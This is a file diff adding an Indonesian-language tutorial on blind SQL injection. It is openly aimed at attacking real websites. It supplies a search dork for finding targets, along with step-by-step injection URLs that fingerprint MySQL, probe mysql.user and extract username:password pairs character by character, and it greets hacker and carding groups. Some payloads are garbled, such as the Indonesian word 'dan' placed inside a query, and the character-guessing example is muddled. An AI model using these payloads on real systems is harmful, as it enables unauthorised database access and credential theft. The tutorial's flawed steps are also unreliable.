@@ -1,0 +1,156 @@
+=========================================================
+Tutorial Blind SQL Injection Referensi Indonesia
+=========================================================
+[+]Author	 : jos_ali_joe
+[+]Contact	 : josalijoe[at]yahoo[dot]com
+[+]Home 	 : http://josalijoe.wordpress.com/ & http://indonesiancoder.com/
+
+Pendahuluan 
+
+Maaf sebelum nya disini saya hanya memberikan apa yang memang saya pelajari tentang Blind SQL Injectiuon
+kalau mungkin dalam penjelasan ini kurang di mengeti mohon di maklumi hanya tutor cupu dari saya
+dan buat yang sudah master tentang Blind SQL kalau dari penjelasan saya ada kesalahan mohon di luruskan
+
+[~] Apa Itu Blind SQL Injection 
+
+Mari di sini kita membahas Blind SQL tanpa metode SQL Injection 
+Mungkin sudah banyak yang tahu tentang metode SQL Inject. Oke Lanjut :D
+Blind SQL Ini adalah metode hacking yang memungkinkan seorang Attacker yang tidak sah untuk mengakses server database. 
+Hal ini difasilitasi oleh sebuah kesalahan pengkodean umum: program menerima data dari klien dan mengeksekusi query SQL tanpa terlebih dahulu memvalidasi masukan klien. 
+Attacker kemudian bebas untuk mengekstrak, memodifikasi, menambah, atau menghapus konten dari database
+Attacker bahkan bisa menembus server database dan ke dalam operasi dasar system web yang di eksekusi.
+Attacker biasanya akan mengetes kerentanan SQL injection dengan mengirimkan masukan aplikasi yang akan menyebabkan server untuk menghasilkan sebuah query SQL yang tidak valid.
+Jika server kemudian kembali mengirimkan pesan karena kesalahan ke klien, Si Attacker akan mencoba untuk reverse-engineer bagian dari query SQL yang asli menggunakan informasi yang diperoleh dari pesan kesalahan tersebut.
+Ciri khas dari administratif safeguard hanya untuk melarang menampilkan pesan kesalahan database server. 
+Sayangnya itu tidak cukup.Jika aplikasi anda tidak ada pesan error, mungkin masih rentan terhadap serangan SQL
+Maaf bahasa nya terlalu kurang di mengerti.
+
+[~] Mendeteksi Blind SQL Injection 
+
+Aplikasi Web biasanya menggunakan query SQL dengan masukan klien yang disertakan dalam klausa WHEREUntuk mengambil data dari database. 
+Dengan menambahkan kondisi tambahan untuk pernyataan SQL dan mengevaluasi output aplikasi web, Anda dapat menentukan apakah atau tidak aplikasi yang rentan terhadap SQL injection.
+
+[~] Blind SQL Injection
+
+Oke mari lanjut ke contoh Eksekusi Blind SQL Injection setelah di atas sudah menjelaskan tentang apa itu Blind SQL Injection dan Mendeteksi nya.
+Yupz Lanjut Kang Disini saya menggunakan Contoh Eksekusi dengan dork [ inurl:news.php?id= ]
+Contoh : http://www.site.com/news.php?id=2
+Yuk Bareng Kita Inject : 
+http://www.site.com/news.php?id=2 dan 1 = 1 <--- ini selalu benar dan load halaman dari web itu sendiri masih normal
+http://www.site.com/news.php?id=2 dan 1 = 2 <--- ini salah, jika masih ada beberapa teks, gambar atau beberapa konten yang hilang pada halaman kdari web kembali maka web tersebut rentan terhadap serangan Blind SQL Injection
+
+[~] Mendapatkan Versi My SQL 
+
+Untuk mendapatkan versi MySQL dalam serangan blind harus menggunakan substring:
+http://www.site.com/news.php?id=2 and substring(@@version,1,1)=4
+Hal ini harus mengembalikan TRUE jika versi MySQL 4. Ganti 4 dengan 5, dan jika kembali query TRUE maka versi adalah 5.
+
+[~] Memeriksa SubSelect
+
+Ketika Kita menginject dan tidak bekerja maka kita gunakan subselect.
+http://www.site.com/news.php?id=2 and (select 1)=1
+Jika halaman web tersebut berubah normal kemudian subselect bekerja, maka kita akan melihat apakah kita memiliki akses ke mysql.user:
+http://www.site.com/news.php?id=2 and (select 1 from mysql.user limit 0,1)=1
+Jika load halaman web biasanya kita memiliki akses ke mysql.user dan kemudian kita bisa menarik beberapa load_file password menggunakan () fungsi dan outfile.
+
+[~] Memeriksa Tabel dan Nama Kolom
+
+Ini tingkat susah enak nya Blind SQL itu sendiri di sini keberuntungan dan menebak-nebak bekerja lebih dari apa pun.
+http://www.site.com/news.php?id=2 and (select 1 from users limit 0,1)=1
+(Dengan limit 0,1 query kita disini mengembalikan 1 baris data, menyebabkan kembali subselect hanya 1 baris, ini sangat penting)
+Jika Anda mendapatkan FALSE (beberapa artikel yang hilang), hanya mengubah nama tabel sampai anda menebak yang benar.
+Nah seumpama di sini kita sudah mendapatkan nama tabel pengguna, sekarang apa yang kita butuhkan adalah kolom nama. 
+Sama dengan nama tabel, kita mulai menebak. Seperti saya bilang sebelumnya coba nama umum untuk kolom:
+http://www.site.com/news.php?id=2 and (select substring(concat(1,password),1,1) from users limit 0,1)=1
+Jika halaman web yang kita inject biasanya kita tahu bahwa nama kolom adalah password (jika kita mendapatkan
+yang false kemudian coba nama umum atau hanya menebak). 
+Di sini kita menggabungkan 1 dengan password kolom, kemudian substring kembali karakter pertama (1,1)
+
+[~] Mendapatkan Full Data Dari Web Yang Kita Inject
+
+Kita telah menemukan  tabel kolom username i password sehingga kami akan tarik karakter tersebut.
+http://www.site.com/news.php?id=2 and ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),1,1))>80
+Ok di sini mari kita menarik karakter pertama dari pengguna pertama di tabel pengguna. 
+Substring di sini mengembalikan karakter pertama dan 1 karakter panjangnya. ascii () mengkonversi bahwa 1 karakter ke nilai ascii dan kemudian membandingkannya dengan simbol yang lebih besar kemudian>. 
+Jadi jika ascii char lebih besar dari 80, beban halaman normal. (TRUE) kita terus mencoba sampai kita mendapatkan false.
+http://www.site.com/news.php?id=2 and ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),1,1))>95
+Disini saya mendapatka True mari kita naikan true nya
+http://www.site.com/news.php?id=2 and ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),1,1))>98
+Belum dapat juga true nya mari kita tambahkan lagi 
+http://www.site.com/news.php?id=2 and ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),1,1))>99
+Yupz Ternyata False ada di 99 .. :P
+Jadi karakter pertama di username adalah char (99). karena (99) adalah huruf 'c' . Coba convert aja di ascii :P
+Jadi teruslah Tambahkan sampai kita mendapatkan nya . (Ketika> 0 returns false kita tahu bahwa kita telah mencapai akhir)
+
+[~] Beberapa Pertanyaan
+
+Tanya : Untuk mengetahui char nya dari mana ??
+Jawab : http://ascii-table.com/
+
+Tanya : blind sql injection cisa buat inject smua site??
+Jawab : bisa buat injek semua site yang memiliki bug sql. klo mau sih yg v5 pun bisa pakai blind injek. tp v5 kan ada table information_schema. jd di manfaatin.
+
+Tanya : Trus buat ngecek bug cuma make ',and 1=1,and 1=0?? ad yg laen??
+Jawab : bisa juga pakai tanda minus di belakangnya ( ?id=1- )
+
+Tanya : maksudnya true am false apa? kalau true halaman web tetep? klo false halaman web burbah ?
+Jawab : true = return benar sesuai kondisi yg di tentukan.
+        false = return salah berdasar kondisi yg di tentukan.
+        misal : and 1=1
+		=> true jika berita muncul. karena 1=1 adalah benar, jd muncul.
+		=> false jika berita tidak muncul
+
+		and 1=2
+		=> true jika berita tidak muncul. karena 1=2 adalah salah, jd gak muncul.
+		=> false jika berita ternyata muncul
+
+Tanya : blind sql injection bisa nginjek .htm? ato cuma yg php ujungnya?
+Tanya : .htm, .php, .asp, dll. itu tergantung config server. ada server yang di config kalau file berextensi .htm adalah php itu bisa saja. 
+		tapi normalnya, adalah .php. karena php yg mengelola data di server. tetepi sprt yg gw katakan barusan, gak semua yg .php, tp .htm pun bisa berisi php, sesuai config.
+
+[~] Penutup
+
+Terima kasih sudah membaca tutor cupu dari saya . mohon untuk jangan Tertawa jika ada yang salah .
+
+Referensi : Google - Packetstorm Security - Wikipedia - Hacker Newbie
+
+Grettz : ./Devilzc0de crew - Kebumen Cyber - Explore Crew - Indonesian Hacker - Tecon Crew - Palembang Hacker Link - Codenesia
+
+		 ./Byroe Net - Yogya Carderlink - Wannabe Hacker - anten4 - Hacker Newbie - Packetstorm Security - All Forum Underground Indonesia
+
+My Team : ./Indonesian Coder
+
+Special Thanks :./ Allah S.w.t & Muhammad S.a.w
+				./ Terima kasih buat guru Blind Sql : ./ArRay - game over - gt_portnoy
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
